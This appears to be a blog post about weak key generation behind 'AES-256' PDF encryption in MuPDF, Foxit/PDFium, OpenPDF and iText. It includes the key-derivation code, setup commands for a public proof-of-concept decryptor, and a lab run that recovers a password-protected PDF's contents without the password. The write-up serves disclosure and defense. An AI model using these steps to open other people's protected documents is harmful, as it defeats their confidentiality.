---
titre: "Your PDF says AES-256. The key had 9 bits of entropy."
date: 2026-10-28
themes: securite, crypto
resume: "MuPDF called it AES-256. The key came from a timestamp-seeded LCG with 9 bits of entropy: 512 candidate keys, 7 ms to generate them all, and I decrypted my own password-protected PDF in 0.63 s without the password. The full lab, reproducible."
source: https://dev.to/slabb/your-pdf-says-aes-256-the-key-had-9-bits-of-entropy-cdg
image: https://media2.dev.to/dynamic/image/width=1000,height=420,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fzegr1mn1hu4dvsuj944u.png
image_alt: "Your PDF says AES-256. The key had 9 bits of entropy."
---

> I just created a PDF with AES-256 encryption and a password, watched the reader refuse to open it without that password, and then decrypted it **without any password in 0.63 seconds**, secret contents fully recovered. The tool that did it is public since yesterday. The vulnerability is not in AES, and not in the password: it is in the **key generation**, where a "256-bit" key was derived from a timestamp-seeded pseudo-random generator with **9 bits of effective entropy**. This is the story of [V12's PDF decryptors](https://v12.sh/blog/the-case-of-the-9bit-aes-key), and below is the lab I ran end to end on my machine, which you can rerun in ten minutes.

## What PDF encryption is supposed to do

PDF standard security, revision 6 (the AES-256 one, `AESV3`), has a sound design: the file is encrypted with a **random 32-byte file key**. Your password never encrypts the document directly; it wraps the file key (`/UE` in the encryption dictionary). Break the design assumption that the 32 bytes are random, and the password stops mattering: recover the file key, read the file, the password never enters the story.

MuPDF before 1.28.5, Foxit Reader 2026.1.3, OpenPDF 3.0.5 and iText 9.7.1 each broke that assumption differently. Same AES-256 label, same certificate on the box, entropy theater inside.

## MuPDF: 9 bits, 512 keys, 7 milliseconds

MuPDF's `fz_memrnd()` generated the file key from a 48-bit LCG (`drand48` family) seeded once with the **epoch time in seconds**. Two implementation details collapse the space:

- each output byte keeps only **state bits 17-24** of the LCG;
- the seeding initializes the low 16 bits of the state to the constant `0x330E`.

Run the math and only **9 bits of the timestamp influence the output stream**: timestamps 512 seconds apart produce the identical "random" bytes. I verified this directly, using the exact derivation from V12's published PoC (POSIX LCG constants, `a=0x5DEECE66D`, `c=0xB`):

```python
state = 0x330E | ((seed & 0xFFFF) << 16) | (((seed >> 16) & 0xFFFF) << 32)
# each byte: state = (a*state + c) mod 2**48 ; byte = (state >> 17) & 0xFF
```

```text
keystream(t)      == keystream(t + 512)  : True
keystream(t)      != keystream(t + 511)  : True
512 candidate keystreams generated in   : 7 ms
```

A "256-bit" key with 512 candidates. The encrypted permissions field `/Perms` gives a known-plaintext oracle: for each candidate key, check whether the decryption matches the document's permission bits. One of the 512 passes.

## The lab, end to end

Reproducible on any machine with Python and Homebrew:

```bash
brew install mupdf                      # mutool 1.28.5 (fixed; used only as the reader/writer)
python3 -m venv v && v/bin/pip install "pymupdf<1.28.5" cryptography
git clone https://github.com/v12-security/pocs
```

Step 1: create a victim with the vulnerable stack (pymupdf 1.28.2 bundles MuPDF 1.28.2):

```python
import pymupdf
doc = pymupdf.open(); page = doc.new_page()
page.insert_text((72, 200), "TOP SECRET: the mermaid lands at 0400. Auth code KHAKI-7741.")
doc.save("secret.pdf", encryption=pymupdf.PDF_ENCRYPT_AES_256,
         user_pw="hunter2", owner_pw="owner-pw")
```

Step 2: confirm the lock is real. `mutool show secret.pdf trailer` answers `cannot authenticate password`. The encryption dictionary says `/AESV3`, `/R 6`. Everything looks exactly like strong crypto is supposed to look.

Step 3: the attack, no password:

```text
$ v/bin/python pocs/pdf_decryptors/mupdf/decrypt.py secret.pdf decrypted.pdf
[+] Recovered and verified the AES-256 file key
    seed time(NULL) mod 512 = 33
    key  022531fd36d99f642258484ad123e7ab0188b951af6718623a11b813364c7c7b
[+] Wrote unencrypted PDF to decrypted.pdf
                                      (0.12 s user, 0.63 s wall)
```

Step 4: read the plaintext:

```text
$ mutool draw -F txt -o - decrypted.pdf
TOP SECRET: the mermaid lands at 0400. Auth code KHAKI-7741.
```

Twelve hundred milliseconds after meeting the file, its "AES-256" protection is a memory. The PoC then re-wraps the recovered key under a known password and lets mutool write a clean copy; brute force was never needed because there were only ever 512 keys.

## Foxit: SHA-256, a timestamp, and the word "there"

Foxit Reader 2026.1.3.36551 derived its file key as **SHA-256 of a 32-bit timestamp, 32 uninitialized bytes (zeros in practice), and the literal string `"there"`**. From the published Rust PoC, verbatim:

```rust
material[..4].copy_from_slice(&timestamp.to_le_bytes());
material[36..].copy_from_slice(b"there");
```

Thirty-two bits of timestamp means 2^32 candidates at worst, but the `/Perms` known-plaintext check prunes instantly, and a 32-thread search covers **every second since 1970 in under five seconds**. The uninitialized-memory bytes add zero entropy on every machine V12 tested.

The lineage detail that widens the blast radius: this exact derivation appears in **PDFium's first public commit (May 2014)**, with the file crediting Foxit as the original author. PDFium is Chromium's PDF engine, embedded in countless editors and viewers. Anyone who copied that code path inherited a timestamp-derived "AES-256" key.

OpenPDF 3.0.5 and iText 9.7.1 close the set: keys from an **ARC4 stream seeded with a millisecond timestamp plus the JVM's free memory**, guessable from the plaintext salts in `/U` and `/O`, with a larger but still tractable search.

## The cipher was never the problem

This is the pattern the whole month has been about, in miniature. AES-256 is fine. The password wrapping is fine. The spec (rev 6) is fine. What broke was the boring plumbing between "the spec says random" and "the code called rand()": an LCG seeded by a clock, uninitialized memory, a string someone needed for alignment. The same class of failure as the CA whose intermediate key was the number 4 and the KV pool sized at 65% of the context window: **the strong primitive at the end of a weak pipe is a weak primitive**. "AES-256" on a feature list is a claim about 2^256, and the only thing that makes it true is where the key bytes come from.

## What to do now

- **MuPDF users**: 1.28.5 fixes key generation, but **does not fix existing files**: every AES-256 PDF written by an older MuPDF still has one of 512 keys today. If those documents matter, treat them as unencrypted and re-issue them: new file, current software. `pymupdf` ships vulnerable MuPDF across many versions, so check what your pipeline embeds (`pymupdf.mupdf_version_tuple`).
- **Foxit / PDFium-derivatives**: update, then assume PDFs written by affected versions are timestamp-recoverable and re-issue what matters.
- **Everyone else**: next time a vendor says "military-grade AES-256", ask where the key bytes come from. That question, answered honestly, is the entire field of cryptography engineering.

**TL;DR**: password-protected "AES-256" PDFs from MuPDF < 1.28.5 have 9 bits of key entropy: 512 candidates, 7 ms to generate, sub-second recovery with public tooling. Foxit hashed a timestamp and the string "there"; PDFium carried that code since 2014. I created, locked, and passwordlessly decrypted one in my lab in under a second, with every command above reproducible.

Sources: [V12: The case of the 9 bit AES key](https://v12.sh/blog/the-case-of-the-9bit-aes-key) · [PoC decryptors (v12-security/pocs)](https://github.com/v12-security/pocs) · MuPDF fix in 1.28.5